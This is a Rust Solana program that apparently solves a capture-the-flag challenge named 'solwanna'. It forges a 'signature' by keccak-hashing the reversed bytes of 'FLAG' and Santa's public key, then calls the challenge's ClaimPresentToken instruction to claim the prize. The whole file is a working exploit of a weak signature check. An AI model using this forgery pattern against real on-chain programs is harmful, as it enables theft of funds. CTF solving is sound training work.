use borsh::{BorshDeserialize, BorshSerialize};
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    instruction::{AccountMeta, Instruction},
    pubkey::Pubkey,
    keccak,
    program::invoke,
};

use solwanna::{SolwannaInstructions, SolwannaState};

entrypoint!(solve);

pub fn solve(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();

    let challenge_program = next_account_info(accounts_iter)?;

    let santa_state_account = next_account_info(accounts_iter)?;

    let user_state_account = next_account_info(accounts_iter)?;
    let user_account = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    // Get Santa Pubkey
    let santa_data = santa_state_account.try_borrow_data()?;
    let santa_state = SolwannaState::try_from_slice(&santa_data)?;
    let santa_pubkey = santa_state.santa_pubkey;
    drop(santa_data);

    // Signature forgery
    let present = "FLAG".to_string();
    let mut data_to_sign = present.as_bytes().to_vec();
    data_to_sign.extend_from_slice(santa_pubkey.as_ref());
    data_to_sign.reverse();
    
    let signature_hash = keccak::hash(&data_to_sign);
    let signature = signature_hash.to_bytes();

    let ix_data = SolwannaInstructions::ClaimPresentToken {
        present,
        signature,
    };

    let instruction = Instruction {
        program_id: *challenge_program.key,
        accounts: vec![
            AccountMeta::new(*user_account.key, true),       // payer (Admin/User)
            AccountMeta::new(*santa_state_account.key, false), // santa_state
            AccountMeta::new(*user_state_account.key, false),  // user_state
            AccountMeta::new_readonly(*system_program.key, false), // system_program
        ],
        data: borsh::to_vec(&ix_data)?,
    };

    invoke(
        &instruction,
        &[
            user_account.clone(),
            santa_state_account.clone(),
            user_state_account.clone(),
            system_program.clone(),
            challenge_program.clone(),
        ],
    )?;

    Ok(())
}